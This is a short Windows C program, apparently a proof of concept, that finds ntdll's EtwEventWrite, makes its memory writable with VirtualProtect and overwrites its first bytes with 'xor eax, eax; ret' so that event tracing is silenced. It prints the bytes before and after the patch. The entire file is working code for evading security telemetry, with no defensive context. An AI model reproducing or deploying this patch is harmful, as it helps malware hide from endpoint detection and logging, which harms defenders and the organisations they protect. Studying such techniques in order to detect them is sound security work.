#include <windows.h>
#include <stdio.h>

VOID PrintBytes(PVOID pAddress, SIZE_T size) {
    BYTE* pBytes = (BYTE*)pAddress;
    for (SIZE_T i = 0; i < size; i++) {
        printf("%02X ", pBytes[i]);
    }
    printf("\n");
}

int main()
{
    printf("[+] EtwEventWrite Is going to be patched \n");

    DWORD dwOldProtection = 0x00;
    PVOID pEtwEventWrite = NULL;
    BYTE pShellcode[3] = {
        0x33, 0xC0,  // xor eax, eax
        0xC3        // ret
    };
    
    pEtwEventWrite = GetProcAddress(GetModuleHandleA("ntdll"), "EtwEventWrite");
    if (!pEtwEventWrite)
    {
        printf("[!] GetProcAddress failed with error %d \n", GetLastError());
        return FALSE;
    }

    
    printf("Before Patching..\n");
    
    PrintBytes(pEtwEventWrite, 6);
    
    getchar();
    
    if (!VirtualProtect(pEtwEventWrite, sizeof(pShellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection))
    {
        printf("[!] VirtualProtect [1] failed with error %d \n", GetLastError());
        return FALSE;
    }

    memcpy(pEtwEventWrite, pShellcode, sizeof(pShellcode));

    if (!VirtualProtect(pEtwEventWrite, sizeof(pShellcode), dwOldProtection, &dwOldProtection))
    {
        printf("[!] VritualProtect [2] failed with error %d \n", GetLastError());
        return FALSE;
    }

    printf("After Patching..\n");
    PrintBytes(pEtwEventWrite, 6);
    getchar();

    return TRUE;
}